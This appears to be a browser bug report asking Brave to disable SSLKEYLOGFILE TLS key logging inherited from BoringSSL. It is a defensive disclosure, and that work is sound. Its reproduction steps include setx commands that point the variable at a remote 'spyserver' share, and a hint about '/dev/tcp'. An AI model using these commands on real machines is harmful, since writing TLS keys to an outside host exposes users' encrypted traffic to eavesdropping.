Disable BoringSSL TLS Key Logging SSLKEYLOGFILE


Description
Google Chrome, using BoringSSL, includes the capability to log TLS Key material to a local or remote text file.  This could be used to compromise TLS encryption, for example if a machine is tampered with such that the keys are written to a remote file.
Steps to Reproduce

Set an environment variable
setx SSLKEYLOGFILE c:\temp\tlskey.txt /m
or
setx SSLKEYLOGFILE \spyserver\spyshare\tlskey.txt /m
or
(on linux/mac can be exported to /dev/tcp/...)
Launch the browser (chromium, chrome, brave, firefox)
Check contents of tlskey.txt as you browse
tail c:\temp\tlskey.txt
or in powershell:
get-content c:\temp\tlskey.txt -wait

Actual result:
TLS Keys are logged, even when using Tor Tab.
Expected result:
TLS Keys should not be logged,
Reproduces how often:
Easy to reproduce, this is a feature inherited from Chromium.
Brave version (brave://version info)
Verified on latest production build 0.60.45 Chromium 72.0.3636.109
Reproducible on current release:
Have not tested on beta / dev releases but see no mention in issue tracker.
Website problems only:

Does the issue resolve itself when disabling Brave Shields?
No
Is the issue reproducible on the latest version of Chrome?
Yes, the Chrome developers see keylogging as a feature.

Additional Information
The code for SSLKEYLOGFILE logging is in boringssl.  I would suggest a patch to disable this functionality.
third_party\boringssl\src\ssl\internal.h:1791:// SSLKEYLOGFILE functions.
third_party\boringssl\src\tool\client.cc:355:  const char *keylog_file = getenv("SSLKEYLOGFILE");
third_party\boringssl\src\tool\server.cc:220:  const char *keylog_file = getenv("SSLKEYLOGFILE");

Historical Note: when originally introduced, SSLKEYLOGFILE was only enabled in development versions of Firefox, but soon was enabled in all versions.  When Chrome used NSS it inherited the feature.  When Chome moved to BoringSSL, the feature was added, and it is now also available in OpenSSL 1.1.1, curl, etc.  The Tor Browser project disables TLS Key logging from Firefox.
